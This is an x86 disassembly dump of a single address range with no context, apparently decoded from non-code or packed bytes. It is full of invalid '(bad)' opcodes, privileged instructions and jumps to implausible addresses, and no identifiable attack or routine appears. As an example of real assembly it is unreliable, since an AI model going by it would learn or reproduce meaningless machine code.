  430347:	shr    BYTE PTR [ecx],1
  430349:	ret    
  43034a:	add    dh,al
  43034c:	mov    eax,ecx
  43034e:	cld    
  43034f:	test   BYTE PTR [eax+0x101],al
  430355:	inc    ebp
  430356:	xor    BYTE PTR [ebx],dh
  430358:	push   edi
  430359:	mov    ecx,0xffe48d89
  43035e:	inc    ebp
  43035f:	enter  0x4d8b,0xfc
  430363:	mov    eax,ebx
  430365:	or     BYTE PTR [ebx+0x38732c1],bl
  43036b:	add    DWORD PTR [ebp-0xbac000],ecx
  430371:	add    al,ch
  430373:	add    BYTE PTR [ecx],ch
  430375:	inc    DWORD PTR [eax]
  430377:	cld    
  430378:	mov    edi,DWORD PTR [ebp-0xc]
  43037b:	mov    esi,DWORD PTR [ebp-0x4]
  43037e:	xor    edx,DWORD PTR [eax+0x8d0103]
  430384:	and    BYTE PTR [ebp+0x50e800ff],bl
  43038a:	sub    DWORD PTR [ebp+0x0],eax
  43038d:	mov    edi,edi
  43038f:	test   al,0xe4
  430391:	add    BYTE PTR [ebp-0x1],cl
  430394:	xor    ebp,eax
  430396:	add    esp,DWORD PTR [esi]
  430398:	cmp    eax,DWORD PTR [eax]
  43039a:	jne    0x4303e9
  43039c:	(bad)  
  43039d:	mov    ebx,eax
  43039f:	pushf  
  4303a0:	add    BYTE PTR [eax],al
  4303a2:	add    BYTE PTR [ecx-0x37474bb],cl
  4303a8:	or     BYTE PTR [eax+0x8401c3],bh
  4303ae:	fwait
  4303af:	jne    0x4303e3
  4303b1:	xor    ecx,DWORD PTR [ecx+0x457c088d]
  4303b7:	inc    DWORD PTR [ebp-0x74d68b18]
  4303bd:	add    BYTE PTR [eax+0x33fc4d8b],bh
  4303c3:	or     BYTE PTR [ebp+0x72000801],0x30
  4303ca:	add    BYTE PTR [edi+0x45],dl
  4303cd:	or     DWORD PTR [ebx-0x3c95471c],0xffffffff
  4303d4:	gs test ebp,ecx
  4303d7:	je     0x430404
  4303d9:	mov    eax,DWORD PTR [ebx]
  4303db:	cld    
  4303dc:	sar    BYTE PTR [eax+0x3b0145],1
  4303e2:	pcmpeqw mm4,mm2
  4303e5:	xor    edi,edi
  4303e7:	lea    ecx,[ebx-0x23927470]
  4303ed:	add    BYTE PTR [ebp+0x50],cl
  4303f0:	cmp    eax,DWORD PTR [ebp+0x75]
  4303f3:	mov    ebp,DWORD PTR [eax-0x68]
  4303f6:	test   DWORD PTR [eax],eax
  4303f8:	clc    
  4303f9:	push   DWORD PTR [ebp-0x1]
  4303fc:	lea    ecx,[eax]
  4303fe:	int3   
  4303ff:	inc    ebp
  430400:	call   0xfb3590
  430405:	jne    0x4303ff
  430407:	xor    edi,DWORD PTR [ebp-0x41]
  43040a:	jmp    0x43047e
  43040c:	mov    eax,DWORD PTR [eax]
  43040e:	mov    eax,0x339545c7
  430413:	inc    DWORD PTR [ebx]
  430415:	push   DWORD PTR [ecx]
  430417:	inc    ecx
  430418:	mov    eax,DWORD PTR [eax]
  43041a:	jmp    0x43046c
  43041c:	mov    eax,DWORD PTR [ebp-0x3c]
  43041f:	mov    eax,eax
  430421:	cld    
  430422:	clc    
  430423:	ret    
  430424:	test   bh,al
  430426:	pop    es
  430427:	xchg   ebp,eax
  430428:	add    bh,bh
  43042a:	inc    ebp
  43042b:	dec    DWORD PTR [edi]
  43042d:	sub    ebp,DWORD PTR [ebx]
  43042f:	add    BYTE PTR [eax],al
  430431:	push   eax
  430432:	jbe    0x430489
  430434:	mov    cl,BYTE PTR [ebx-0x34e00b80]
  43043a:	or     al,0xcf
  43043c:	inc    eax
  43043d:	enter  0x745,0x72
  430441:	inc    ebp
  430442:	mov    eax,DWORD PTR [ecx]
  430444:	int3   
  430445:	add    BYTE PTR [ebp-0x75],al
  430448:	xor    DWORD PTR [eax+0x33c74d9c],edi
  43044e:	ror    BYTE PTR [ebp+0x72f80885],1
  430454:	inc    ebp
  430455:	add    BYTE PTR [ebx-0x3c7423bb],cl
  43045b:	fadd   st,st(6)
  43045d:	rol    BYTE PTR [ebp+0x12],0x8b
  430461:	inc    ebp
  430462:	fmul   QWORD PTR [ebx-0x3c39233d]
  430468:	inc    ebp
  430469:	test   bh,al
  43046b:	fwait
  43046c:	clc    
  43046d:	xor    al,BYTE PTR [ebp+0x45dcf889]
  430473:	inc    ebp
  430474:	xor    esi,DWORD PTR [ebx]
  430476:	pushf  
  430477:	mov    ecx,0xffb48dc7
  43047c:	test   eax,ecx
  43047e:	clc    
  43047f:	dec    ebp
  430480:	inc    ebp
  430481:	mov    edi,DWORD PTR ds:0xc7c19c08
  430487:	xchg   BYTE PTR [esi+edi*8-0x807007b],ah
  43048e:	inc    ebp
  43048f:	inc    ebp
  430490:	aas    
  430491:	mov    ebx,DWORD PTR [eax+ecx*1+0x18e8c8c7]
  430498:	test   DWORD PTR [ecx],esi
  43049a:	clc    
  43049b:	pushf  
  43049c:	inc    ebp
  43049d:	dec    DWORD PTR [ebx-0x3cba0f04]
  4304a3:	push   eax
  4304a4:	mov    BYTE PTR [edx],0x7d
  4304a7:	add    BYTE PTR [ebx],bh
  4304a9:	mov    ecx,DWORD PTR [edi]
  4304ab:	mov    DWORD PTR [eax],ebx
  4304ad:	les    eax,FWORD PTR [eax]
  4304af:	adc    ebp,ecx
  4304b1:	dec    ebp
  4304b2:	add    DWORD PTR [ebx-0x34ba3c00],ecx
  4304b8:	mov    ecx,esi
  4304ba:	lock or al,cl
  4304bd:	clc    
  4304be:	inc    ebp
  4304bf:	add    esi,DWORD PTR [ebx]
  4304c1:	jge    0x4304c6
  4304c3:	xor    edi,DWORD PTR [ebx]
  4304c5:	cmp    ecx,DWORD PTR [edi]
  4304c7:	paddb  mm1,QWORD PTR [eax+eax*1+0x0]
  4304cc:	mov    edi,DWORD PTR [ecx]
  4304ce:	test   al,0xcc
  4304d0:	dec    ebp
  4304d1:	test   BYTE PTR [ebx],dh
  4304d3:	pop    es
  4304d4:	xor    eax,DWORD PTR [eax]
  4304d6:	add    ecx,DWORD PTR [esi]
  4304d8:	add    ecx,eax
  4304da:	psraw  mm0,mm1
  4304dd:	sub    BYTE PTR [ebp+0x38],cl
  4304e0:	mov    edi,DWORD PTR [ebx]
  4304e2:	lock int3 
  4304e4:	shl    edx,1
  4304e6:	rol    BYTE PTR [ebp+0xc],1
  4304e9:	mov    DWORD PTR [ebp-0x24],0xf8038533
  4304f0:	jmp    0x75053a
  4304f5:	pushf  
  4304f6:	inc    ebp
  4304f7:	mov    DWORD PTR [ebx-0x3cba0710],ecx
  4304fd:	xor    ecx,ebx
  4304ff:	add    ecx,esi
  430501:	mov    esi,eax
  430503:	enter  0x45af,0x8b
  430507:	xor    ecx,eax
  430509:	add    edx,DWORD PTR [ebp-0x77]
  43050c:	sub    ecx,DWORD PTR [eax]
  43050e:	cmp    eax,DWORD PTR [ebp+0x77]
  430511:	ror    DWORD PTR [ebx-0x76385764],1
  430517:	test   al,0x0
  430519:	test   DWORD PTR [ebx+0x4d45acf8],ecx
  43051f:	cmp    al,0x33
  430521:	pushf  
  430522:	xor    eax,edi
  430524:	add    ebp,DWORD PTR [ebx+eax*1-0x3e07f07b]
  43052b:	inc    ebp
  43052c:	dec    ebp
  43052d:	mov    ebx,DWORD PTR ds:[eax+esi*8-0x2f432e39]
  430535:	test   DWORD PTR ds:0xeb4545f8,eax
  43053b:	cmp    BYTE PTR [ebx+0x4d8ba49c],cl
  430541:	fdiv   QWORD PTR [ebx]
  430543:	dec    ebp
  430544:	xor    esi,DWORD PTR [ebx]
  430546:	add    eax,DWORD PTR [ebx]
  430548:	add    ecx,DWORD PTR [ecx-0x373e4ff1]
  43054e:	dec    ebp
  43054f:	test   BYTE PTR [ebx-0x2eff0ffe],cl
  430555:	out    dx,eax
  430556:	rol    BYTE PTR [eax],1
  430558:	add    eax,0xebc8458b
  43055d:	dec    ebp
  43055e:	mov    ebp,DWORD PTR [ebx]
  430560:	mov    esp,0x33f84d8b
  430565:	ret    
  430566:	xor    eax,esi
  430568:	add    ecx,eax
  43056a:	add    eax,DWORD PTR [edx+0xc1010f]
  430570:	dec    ebp
  430571:	inc    ebp
  430572:	mov    ecx,DWORD PTR [ebx-0x3c2e0710]
  430578:	ror    bl,1
  43057a:	add    eax,0xebc645ce
  43057f:	scas   eax,DWORD PTR es:[edi]
  430580:	mov    ecx,DWORD PTR [ebx+0x554dc8e8]
  430586:	xor    ebp,DWORD PTR [ebx]
  430588:	xor    edi,DWORD PTR [ebx]
  43058a:	add    esi,DWORD PTR [edi+0x3]
  43058d:	mov    ecx,DWORD PTR [edi]
  43058f:	clc    
  430590:	rol    ebx,0x4d
  430593:	(bad)  
  430594:	mov    edi,DWORD PTR [eax+esi*8-0x2f742f00]
  43059b:	mov    ah,0x45
  43059d:	dec    ebp
  43059e:	jbe    0x4305d3
  4305a0:	mov    esi,DWORD PTR [ebx]
  4305a2:	call   0x334652aa
  4305a7:	rdpmc  
  4305a9:	rol    DWORD PTR [ebx],0x4d
  4305ac:	add    ecx,DWORD PTR [ebx-0x2e3e0ff1]
  4305b2:	inc    ebp
  4305b3:	ror    BYTE PTR [ebx+0x45450808],1
  4305b9:	jmp    0x10b0649
  4305be:	inc    ebp
  4305bf:	inc    ebp
  4305c0:	(bad)  
  4305c1:	mov    ebx,eax
  4305c3:	clc    
  4305c4:	test   ebx,eax
  4305c6:	clc    
  4305c7:	retf   
  4305c8:	inc    ebp
  4305c9:	into   
  4305ca:	mov    esi,0x8b85afec
  4305d0:	clc    
  4305d1:	enter  0x5545,0x33
  4305d5:	sub    ebx,DWORD PTR [ebx+edi*1-0x74278875]
  4305dc:	ret    
  4305dd:	mov    ah,0xc6
  4305df:	addr16 push 0x338b4545
  4305e5:	clc    
  4305e6:	add    eax,ebx
  4305e8:	loopne 0x4305b5
  4305ea:	dec    ebp
  4305eb:	into   
  4305ec:	mov    al,dh
  4305ee:	or     BYTE PTR [edi-0x37ff748e],ch
  4305f4:	inc    ebp
  4305f5:	push   ebp
  4305f6:	mov    ebp,DWORD PTR [ebx]
  4305f8:	in     al,dx
  4305f9:	cmp    eax,ebx
  4305fb:	ja     0x430642
  4305fd:	mov    ecx,DWORD PTR [ebx-0x7bba2354]
  430603:	inc    ebp
  430604:	fwait
  430605:	mov    esi,DWORD PTR [edx]
  430607:	clc    
  430608:	mov    bl,al
  43060a:	xlat   BYTE PTR ds:[ebx]
  43060b:	retf   
  43060c:	inc    ebp
  43060d:	into   
  43060e:	mov    eax,esi
  430610:	in     al,dx
  430611:	scas   eax,DWORD PTR es:[edi]
  430612:	retf   
  430613:	mov    ecx,DWORD PTR [ebp-0x38]
  430616:	mov    edx,DWORD PTR [ebp-0x24]
  430619:	sub    eax,DWORD PTR [ebx+edi*1-0x74cd8865]
  430620:	mov    ah,BYTE PTR [edi+edx*8+0x33454d23]
  430627:	mov    eax,DWORD PTR [ebx]
  430629:	clc    
  43062a:	loopne 0x4305ef
  43062c:	push   ebp
  43062d:	retf   
  43062e:	mov    dh,al
  430630:	adc    esi,ecx
  430632:	jb     0x4305e3
  430634:	add    BYTE PTR [ebx+0x558bc845],cl
  43063a:	in     al,dx
  43063b:	sub    eax,ebx
  43063d:	cmp    ecx,ebx
  43063f:	mov    eax,esi
  430641:	mov    esp,0x45af03ce
  430646:	add    ecx,DWORD PTR [ebx-0x34ba0720]
  43064c:	mov    eax,ebx
  43064e:	in     al,dx
  43064f:	into   
  430650:	dec    ebp
  430651:	(bad)  
  430652:	xor    ebp,DWORD PTR [edi+0x80f8903]
  430658:	rol    DWORD PTR [ebp+0x4d],0x89
  43065c:	xor    esp,esp
  43065e:	sub    eax,DWORD PTR [ebp-0x75]
  430661:	add    ebp,esp
  430663:	mov    al,0x55
  430665:	inc    ebp
  430666:	xor    esi,DWORD PTR [ecx]
  430668:	add    ebx,DWORD PTR [edi+ecx*1+0x55dcca89]
  43066f:	inc    ebp
  430670:	xor    esi,DWORD PTR [edx]
  430672:	sub    ebx,DWORD PTR [ebp+ecx*4+0x72c011c7]
  430679:	test   DWORD PTR [eax],eax
  43067b:	clc    
  43067c:	enter  0x8645,0x33
  430680:	inc    DWORD PTR [ebx]
  430682:	(bad)  
  430683:	jmp    0x4306ca
  430685:	mov    ecx,DWORD PTR [ebx-0x3c3c1b28]
  43068b:	inc    ebp
  43068c:	(bad)  
  43068d:	mov    ebp,DWORD PTR [edi-0x277b7424]
  430693:	fwait
  430694:	retf   
  430695:	xor    al,cl
  430697:	mov    BYTE PTR [ebp+0xb],cl
  43069a:	lea    eax,[ebp+0x8]
  43069d:	xor    esi,DWORD PTR [edx+0x3]
  4306a0:	add    al,ah
  4306a2:	inc    ebp
  4306a3:	dec    ebp
  4306a4:	mov    ecx,DWORD PTR [edx+0x72c308d0]
  4306aa:	gs add ch,cl
  4306ad:	inc    ebp
  4306ae:	sub    ecx,DWORD PTR [edx+0x4df00b03]
  4306b4:	inc    ebp
  4306b5:	xor    ecx,DWORD PTR [ebx-0x3c1f37fd]
  4306bb:	push   ebp
  4306bc:	(bad)  
  4306bd:	mov    BYTE PTR [edi+0xf723b11],ch
  4306c3:	add    ch,ch
  4306c5:	inc    ebp
  4306c6:	dec    DWORD PTR [ebx-0x34332775]
  4306cc:	add    al,0x4d
  4306ce:	inc    ebp
  4306cf:	mov    ecx,DWORD PTR [ebx-0x7f7b0324]
  4306d5:	fwait
  4306d6:	add    DWORD PTR [edx],esi
  4306d8:	add    BYTE PTR [ebx+0x4d00c000],cl
  4306de:	push   DWORD PTR [ebx]
  4306e0:	int3   
  4306e1:	xor    eax,DWORD PTR [eax]
  4306e3:	add    edx,DWORD PTR [eax+0x3]
  4306e6:	mov    DWORD PTR [edi],ecx
  4306e8:	call   0x4288c7ae
  4306ed:	mov    DWORD PTR [ebp-0x20],esp
  4306f0:	add    BYTE PTR [ebp+0x7d],al
  4306f3:	mov    eax,DWORD PTR [eax]
  4306f5:	in     al,0x15
  4306f7:	ret    
  4306f8:	iret   
  4306f9:	(bad)  
  4306fa:	enter  0x14af,0x8b
  4306fe:	(bad)  
  4306ff:	in     al,dx
  430700:	or     bl,cl
  430702:	adc    cl,al
  430704:	push   ebp
  430705:	dec    ebp
  430706:	inc    eax
  430707:	mov    edx,DWORD PTR [ebp-0x20]
  43070a:	jb     0x4306d7
  43070c:	mov    ecx,esi
  43070e:	cld    
  43070f:	scas   eax,DWORD PTR es:[edi]
  430710:	or     BYTE PTR [ebx-0x2cff27ff],0x0
  430717:	mov    BYTE PTR [eax],0x8c
  43071a:	push   0xffffff9b
  43071c:	push   edi
  43071d:	xor    dl,BYTE PTR [eax+0x3b]
  430720:	mov    ecx,DWORD PTR [edi]
  430722:	call   0x8c424c85
  430727:	mov    eax,eax
  430729:	in     al,dx
  43072a:	jge    0x430779
  43072c:	mov    DWORD PTR [ebx],esi
  43072e:	int3   
  43072f:	add    eax,DWORD PTR [ebp+0xf]
  430732:	xor    eax,ecx
  430734:	(bad)  
  430735:	dec    ebp
  430736:	pushf  
  430737:	xor    ecx,esi
  430739:	add    edi,DWORD PTR [edi]
  43073b:	mov    eax,DWORD PTR [ebp-0x38]
  43073e:	(bad)  
  43073f:	test   dh,dl
  430741:	fwait
  430742:	add    esi,DWORD PTR [edx]
  430744:	jmp    0x4306cf
  430746:	mov    cl,al
  430748:	add    eax,0x14330f45
  43074d:	mov    ecx,0xff468d80
  430752:	jmp    0xc990171f
  430757:	mov    edx,ecx
  430759:	rol    BYTE PTR [ebp+0x330155],1
  43075f:	add    ecx,DWORD PTR [ebp+0xf]
  430762:	xor    eax,edx
  430764:	(bad)  
  430765:	ror    DWORD PTR [eax],0x86
  430768:	jb     0x430767
  43076a:	add    bh,bh
  43076c:	clc    
  43076d:	inc    ebp
  43076e:	jb     0x4307da
  430770:	mov    ecx,DWORD PTR [ecx+0x4545c008]
  430776:	xor    DWORD PTR [ebx+0xc7d89c],ecx
  43077c:	shr    BYTE PTR [eax-0x3d],0x30
  430780:	clc    
  430781:	add    BYTE PTR [ebp+0x75],al
  430784:	xor    DWORD PTR [edx-0x64],ebp
  430787:	inc    edi
  430789:	adc    al,0xe8
  43078b:	inc    ebp
  43078c:	test   DWORD PTR [ebp-0x7cba8b08],eax
  430792:	mov    ecx,DWORD PTR [eax]
  430794:	cld    
  430795:	or     DWORD PTR [ebp-0x34],0x33
  430799:	jbe    0x43079e
  43079b:	mov    edx,DWORD PTR [ecx+0x2b]
  43079e:	dec    ebp
  43079f:	mov    cl,BYTE PTR [ebx+0x45d801]
  4307a5:	mov    BYTE PTR [ebx],dh
  4307a7:	mov    eax,DWORD PTR [ebx]
  4307a9:	or     BYTE PTR [ecx+0x3b],dl
  4307ac:	dec    ebp
  4307ad:	int3   
  4307ae:	xor    ebp,edi
  4307b0:	add    eax,DWORD PTR [ebp+0x51]
  4307b3:	mov    ecx,DWORD PTR [ebp-0x28]
  4307b6:	xor    eax,DWORD PTR [eax]
  4307b8:	add    ebp,DWORD PTR [eax+0x51]
  4307bb:	adc    BYTE PTR [eax+0x0],0x8b
  4307bf:	add    BYTE PTR [ebx+0x4d18fcff],cl
  4307c5:	inc    ebp
  4307c6:	mov    ecx,DWORD PTR [ecx+0x4500c4d8]
  4307cc:	xor    ecx,DWORD PTR [ebx+0x4551c403]
  4307d2:	dec    ebp
  4307d3:	mov    esi,DWORD PTR [ebx]
  4307d5:	hlt    
  4307d6:	add    eax,ebx
  4307d8:	push   ecx
  4307d9:	inc    ebp
  4307da:	dec    ebp
  4307db:	(bad)  
  4307dc:	call   esi
  4307de:	in     al,0xc7
  4307e0:	retf   
  4307e1:	mov    al,ds:0xc5ff3dce
  4307e6:	adc    al,0xc6
  4307e8:	inc    ebp
  4307e9:	and    eax,0x9c0f4c85
  4307ee:	cmp    DWORD PTR [esi-0xe7ac800],0xf
  4307f5:	cmp    BYTE PTR [ebx+0x38],0x0
  4307f9:	mov    dh,0xc7
  4307fb:	cmp    eax,eax
  4307fd:	jne    0x45440049
  430803:	mov    esi,DWORD PTR [ebx]
  430805:	mov    eax,0x848bcb9c
  43080a:	rcr    BYTE PTR [ebx-0x7c7fcd0f],0x65
  430811:	or     BYTE PTR [edi],cl
  430813:	(bad)  
  430814:	dec    ebp
  430815:	inc    edi
  430816:	add    bh,0x54
  430819:	or     cl,ch
  43081b:	test   DWORD PTR [eax+0x4d4501f8],ecx
  430821:	add    BYTE PTR [eax-0x1638ab64],0xbc
  430828:	mov    BYTE PTR [ebp+0x45a5f802],dh
  43082e:	(bad)  
  43082f:	cmp    eax,0x89839cff
  430834:	je     0x43081a
  430836:	inc    DWORD PTR [ebp+0x0]
  430839:	mov    ecx,DWORD PTR [ebp-0x340018]
  43083f:	into   
  430840:	dec    DWORD PTR [ebx-0x7f72431c]
  430846:	push   0x5000ff01
  43084b:	retf   
  43084c:	inc    ebp
  43084d:	into   
  43084e:	dec    DWORD PTR [ebx-0x343f3ff4]
  430854:	push   eax
  430855:	into   
  430856:	call   0x4b0ce6
  43085b:	retf   
  43085c:	add    dh,cl
  43085e:	add    bh,bh
  430860:	mov    DWORD PTR [eax+ecx*1],edx
  430863:	clc    
  430864:	inc    ebp
  430865:	inc    ebp
  430866:	mov    ecx,DWORD PTR [ebx-0x7fff1728]
  43086c:	push   0x1
  43086e:	push   edi
  43086f:	add    BYTE PTR [eax-0x35],dl
  430872:	mov    ecx,esi
  430874:	cld    
  430875:	mov    ecx,DWORD PTR [ecx+0xcb01bc]
  43087b:	into   
  43087c:	ror    BYTE PTR [ebx+0x75000800],0x50
  430883:	xor    eax,DWORD PTR [ebp+0x3]
  430886:	jne    0x4308d9
  430888:	call   DWORD PTR [eax-0x3c]
  43088b:	mov    DWORD PTR [ecx-0x18],edx
  43088e:	mov    edi,edi
  430890:	call   0x8b464e19
  430895:	add    ah,ah
  430897:	rol    BYTE PTR [ebp-0x7c],0xeb
  43089b:	add    edi,edi
  43089d:	add    al,ch
  43089f:	inc    ebp
  4308a0:	push   ecx
  4308a1:	cmp    al,0x8b
  4308a3:	pushf  
  4308a4:	(bad)  
  4308a5:	mov    DWORD PTR [ebp-0x50],0xf8e485c7
  4308ac:	test   DWORD PTR [ebp-0x8],ecx
  4308af:	add    BYTE PTR [ebp+0x54],0x32
  4308b3:	jmp    0x8bcc9154
  4308b8:	in     al,dx
  4308b9:	or     BYTE PTR [ebp-0xf],al
  4308bc:	xor    eax,DWORD PTR [eax+0x4f896503]
  4308c2:	hlt    
  4308c3:	mov    eax,DWORD PTR [ebp-0x50]
  4308c6:	xor    esi,ecx
  4308c8:	add    eax,DWORD PTR [eax+0x4f086589]
  4308ce:	inc    ebp
  4308cf:	adc    ecx,0x68
  4308d2:	pushf  
  4308d3:	inc    edi
  4308d5:	add    al,ch
  4308d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4308d8:	test   edi,edi
  4308da:	clc    
  4308db:	inc    DWORD PTR [ebp-0x73]
  4308de:	cmp    al,0x74
  4308e0:	pushf  
  4308e1:	inc    edi
  4308e3:	push   ecx
  4308e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4308e5:	jne    0x43086c
  4308e7:	push   eax
  4308e8:	clc    
  4308e9:	test   DWORD PTR [ebp-0x1],eax
  4308ec:	call   FWORD PTR ds:[ebx+ecx*4+0x70b4c4c7]
  4308f4:	test   DWORD PTR [ebx+0x574510f8],eax
  4308fa:	cmp    BYTE PTR [edx],bl
  4308fc:	pushf  
  4308fd:	add    BYTE PTR [ebx+0x4d80e468],cl
  430903:	add    BYTE PTR [ebx],dh
  430905:	inc    ebp
  430906:	add    ecx,DWORD PTR [ebx-0x7f3f0377]
  43090c:	enter  0x8401,0x0
  430910:	add    al,BYTE PTR [eax]
  430912:	add    bh,bh
  430914:	out    dx,eax
  430915:	sbb    BYTE PTR [eax],al
  430917:	dec    ebp
  430918:	mov    ecx,DWORD PTR [ebx+0x4dd8f4]
  43091e:	sub    esi,DWORD PTR [ebx]
  430920:	mov    ebp,DWORD PTR [eax-0x8]
  430923:	add    bl,0x0
  430926:	(bad)  
  430927:	cmp    eax,ecx
  430929:	or     BYTE PTR [edx+0x750114],al
  43092f:	inc    DWORD PTR [ebp+0x18]
  430932:	mov    eax,DWORD PTR [ebp-0x8]
  430935:	mov    ebx,eax
  430937:	(bad)  
  430938:	retf   
  430939:	inc    ebp
  43093a:	into   
  43093b:	mov    esi,eax
  43093d:	int3   
  43093e:	scas   eax,DWORD PTR es:[edi]
  43093f:	push   es
  430940:	mov    esi,DWORD PTR [ebp-0xc]
  430943:	call   DWORD PTR [ebp+0x18]
  430946:	sub    edi,DWORD PTR [ebp+0x3b]
  430949:	mov    esi,DWORD PTR [edi-0x34]
  43094c:	mov    eax,DWORD PTR [ebp-0x8]
  43094f:	xor    ebx,eax
  430951:	pushf  
  430952:	mov    bh,0xbc
  430955:	fadd   QWORD PTR [eax]
  430957:	test   DWORD PTR [ebx+0x4d45bcf8],ecx
  43095d:	mov    esi,DWORD PTR [ebx]
  43095f:	in     al,0x33
  430961:	ret    
  430962:	add    eax,esi
  430964:	add    eax,DWORD PTR [ebp+0xf]
  430967:	mov    eax,ecx
  430969:	in     al,0x4d
  43096b:	ret    
  43096c:	mov    eax,esi
  43096e:	in     al,dx
  43096f:	inc    ebp
  430970:	rol    edi,1
  430972:	sar    al,1
  430974:	or     BYTE PTR [ebp+0x45e9f845],al
  43097a:	add    BYTE PTR [ebx],dh
  43097c:	add    BYTE PTR [ebp+eax*2-0x7437439],bl
  430983:	test   ebx,eax
  430985:	clc    
  430986:	retf   
  430987:	inc    ebp
  430988:	into   
  430989:	cmp    eax,0xc7af9cc6
  43098e:	mov    ebp,DWORD PTR [esp+esi*8+0x2bf85585]
  430995:	inc    ebp
  430996:	cmp    edi,DWORD PTR [edi]
  430998:	ja     0x430936
  43099a:	mov    eax,edi
  43099c:	mov    esp,0x458567a8
  4309a1:	clc    
  4309a2:	mov    eax,DWORD PTR [ebp-0x8]
  4309a5:	mov    eax,ebx
  4309a7:	in     al,dx
  4309a8:	retf   
  4309a9:	ret    
  4309aa:	into   
  4309ab:	mov    dh,0x7d
  4309ae:	scas   eax,DWORD PTR es:[edi]
  4309af:	cmp    ecx,DWORD PTR [ebx+0x5518f40f]
  4309b5:	add    BYTE PTR [ebx],ch
  4309b7:	jmp    0xba0af7
  4309bc:	mov    eax,DWORD PTR [ebp-0x5c]
  4309bf:	mov    eax,DWORD PTR [ebp-0x14]
  4309c2:	inc    ebp
  4309c3:	enter  0x458b,0xf8
  4309c7:	xor    eax,ebx
  4309c9:	add    ecx,ebx
  4309cb:	cmp    ecx,esi
  4309cd:	shufps xmm7,xmm4,0xaf
  4309d1:	add    BYTE PTR [ebx+0x55e8f48b],cl
  4309d7:	dec    ebp
  4309d8:	sub    esi,DWORD PTR [ebx]
  4309da:	cmp    esi,DWORD PTR [ebx]
  4309dc:	ja     0x4309e1
  4309de:	mov    eax,DWORD PTR [ebx]
  4309e0:	lods   al,BYTE PTR ds:[esi]
  4309e1:	mov    db0,ecx
  4309e4:	inc    ebp
  4309e5:	dec    ebp
  4309e6:	mov    ecx,DWORD PTR [ebx-0x2e3c1308]
  4309ec:	retf   
  4309ed:	rol    dh,1
  4309ef:	or     al,0xce
  4309f1:	inc    ebp
  4309f2:	scas   eax,DWORD PTR es:[edi]
  4309f3:	xor    ecx,DWORD PTR [ebx+0x55e9f403]
  4309f9:	add    BYTE PTR [ebx],ch
  4309fb:	add    BYTE PTR [ebx],bh
  4309fd:	inc    ebp
  4309fe:	mov    ecx,DWORD PTR [ebx-0x3cfc074c]
  430a04:	inc    ebp
  430a05:	retf   
  430a06:	mov    ecx,esi
  430a08:	clc    
  430a09:	(bad)  
  430a0a:	retf   
  430a0b:	scas   eax,DWORD PTR es:[edi]
  430a0c:	ret    
  430a0d:	mov    ecx,esi
  430a0f:	hlt    
  430a10:	(bad)  
  430a11:	push   ebp
  430a12:	scas   eax,DWORD PTR es:[edi]
  430a13:	sub    ecx,DWORD PTR [ecx+0x4577083b]
  430a19:	mov    ecx,DWORD PTR [ecx+0x4589e4e8]
  430a1f:	add    BYTE PTR [ebx],al
  430a21:	mov    eax,eax
  430a23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430a24:	inc    ebp
  430a25:	dec    ebp
  430a26:	xor    DWORD PTR [ebx],esi
  430a28:	pushf  
  430a29:	xor    ecx,DWORD PTR [ecx+0x4503d003]
  430a2f:	rdmsr  
  430a31:	rcr    DWORD PTR [ebp+ecx*2-0x134f7439],0x85
  430a39:	sar    eax,1
  430a3b:	rol    BYTE PTR [ebp+0x5],1
  430a3e:	xor    eax,DWORD PTR [ebp+0x3]
  430a41:	jmp    0x430a2e
  430a43:	mov    ecx,DWORD PTR [ebx-0x3cb22754]
  430a49:	xor    eax,DWORD PTR [ebp+0x33]
  430a4c:	mov    eax,DWORD PTR [ebx]
  430a4e:	rol    BYTE PTR [ebx],1
  430a50:	test   BYTE PTR [edi],cl
  430a52:	fwait
  430a53:	shl    DWORD PTR [edx],0x4d
  430a56:	mov    BYTE PTR [ebx-0x2eba13f5],cl
  430a5c:	xor    edx,eax
  430a5e:	add    eax,DWORD PTR ds:0xeb4d45e0
  430a64:	mov    cl,BYTE PTR [ebx+0x4d72b408]
  430a6a:	add    BYTE PTR [ebx],dh
  430a6c:	inc    ebp
  430a6d:	xor    ecx,DWORD PTR [edx+0x4d030b03]
  430a73:	rdpmc  
  430a75:	rol    DWORD PTR [ebx],0x4d
  430a78:	loopne 0x430a05
  430a7a:	push   ebp
  430a7b:	in     al,dx
  430a7c:	mov    cl,dl
  430a7e:	adc    eax,edx
  430a80:	jb     0x430a87
  430a82:	add    BYTE PTR [ebp+0x45],al
  430a85:	jmp    0x430a12
  430a87:	mov    ebx,eax
  430a89:	test   al,0xcb
  430a8b:	dec    ebp
  430a8c:	dec    ebp
  430a8d:	xor    ecx,DWORD PTR [ebx-0x7bfc2fcd]
  430a93:	add    ebx,DWORD PTR [ebx-0x743ecdf1]
  430a99:	dec    ebp
  430a9a:	mov    al,0x8b
  430a9c:	dec    ebp
  430a9d:	in     al,dx
  430a9e:	xor    edx,ecx
  430aa0:	xor    edx,eax
  430aa2:	add    eax,DWORD PTR [ebp+0x3]
  430aa5:	jbe    0x430ab6
  430aa7:	mov    eax,ecx
  430aa9:	test   al,0x45
  430aab:	dec    ebp
  430aac:	mov    DWORD PTR [ebx],esi
  430aae:	loopne 0x430ae3
  430ab0:	inc    ebp
  430ab1:	add    ecx,DWORD PTR [ebx-0x3cf01bfd]
  430ab7:	rol    esi,0x45
  430aba:	scas   eax,DWORD PTR es:[edi]
  430abb:	mov    ecx,DWORD PTR [ebx-0x34ba0ff8]
  430ac1:	mov    eax,ecx
  430ac3:	hlt    
  430ac4:	dec    ebp
  430ac5:	inc    ebp
  430ac6:	mov    eax,edi
  430ac8:	loopne 0x430aa2
  430aca:	retf   
  430acb:	test   esi,ecx
  430acd:	clc    
  430ace:	scas   eax,DWORD PTR es:[edi]
  430acf:	inc    ebp
  430ad0:	mov    eax,edi
  430ad2:	fdiv   st,st(0)
  430ad4:	rol    DWORD PTR [ebp+0x458cf8c6],cl
  430ada:	fwait
  430adb:	xor    esi,DWORD PTR [edx]
  430add:	pushf  
  430ade:	cmp    ecx,DWORD PTR [ebx-0x3ca127f1]
  430ae4:	inc    esi
  430ae6:	mov    ebp,DWORD PTR [eax-0x10]
  430ae9:	inc    ebp
  430aea:	dec    ebp
  430aeb:	xor    esi,DWORD PTR [ebx]
  430aed:	add    eax,DWORD PTR [ebx]
  430aef:	loopne 0x430b00
  430af1:	dec    ebp
  430af2:	ror    DWORD PTR [edx+0x7233084d],0x3
  430af9:	add    BYTE PTR [ebx-0x7b740bbb],cl
